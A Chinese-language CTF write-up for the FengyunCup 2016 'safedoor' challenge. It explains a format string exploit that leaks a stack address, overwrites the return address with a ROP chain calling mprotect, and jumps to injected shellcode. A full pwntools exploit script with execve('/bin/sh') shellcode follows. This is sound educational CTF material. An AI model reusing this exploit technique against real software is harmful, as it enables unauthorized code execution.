---
title: FengyunCup-2016-safedoor
date: 2016-10-17
tags: [2016，CTFs，fsb]
categories: [stack]
---
## 0x00 Analysis
程序很小，很明显存在格式化字符串漏洞。  
观察到有**mprotect()** 函数，修改0x804a000-0x804b000内存为可读可写执行，所以构造ROP链:
> Mprotect() 0x8048420  
pop pop pop ret
0x804a000  
0x1000  
0x7  
Symbols[gets]  
返回地址0x804a000  
0x804a000


1. 通过**%70$08x**泄露栈地址并计算出保存返回地址的栈地址
2. 修改返回地址为构造的ROP链
3. 程序跳转到0x804a000执行shellcode

## 0x01 Conclusion
- **%70$08x** 读取栈上第70个参数的内容，输出8位16进制数，不够8位，前补0
- **%str(data)c%16$hhn** 向当前栈后第16个参数写一个字节数据

## 0x02 Exp
```python
#!/usr/bin/env python
from pwn import *

def writeData(addr, data, size):
    for i in range(size):
        byte = (data >> 8 * i ) & 0xff
        writeByte(addr + i, byte)


def writeByte(addr, data):
    payload = '%' + str(data) + 'c%16$hhn' if data != 0 else '%16$hhn'
    payload += 'A'*(48 - len(payload)) + p32(addr)
    p.sendline(payload)

def Attack():
    p.recvuntil('KEY:')
    p.sendline('%70$08x')
    recv_content = p.recvuntil('KEY:')
    addr_stack_leak = int(recv_content[-13:-5],16)
    addr_ret = addr_stack_leak - 0xc
    rop_list = [elf.symbols['mprotect'],0x80486cd,0x804a000,0x1000,0x7,elf.     symbols['gets'],0x804a000,0x804a000]
    gdb.attach(p)
    for i,v in enumerate (rop_list):
        writeData(addr_ret + i * 4, v, 4)
    p.recvuntil('KEY:')
    p.sendline('STjJaOEwLszsLwRy')
    p.recvuntil('okey,you entered it.')
    shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73'
    shellcode += '\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0'
    shellcode += '\x0b\xcd\x80'
    p.sendline(shellcode)
    p.interactive()

if __name__ == '__main__':
    elf = ELF('./safedoor')
    p = process('./safedoor')
    Attack()
```
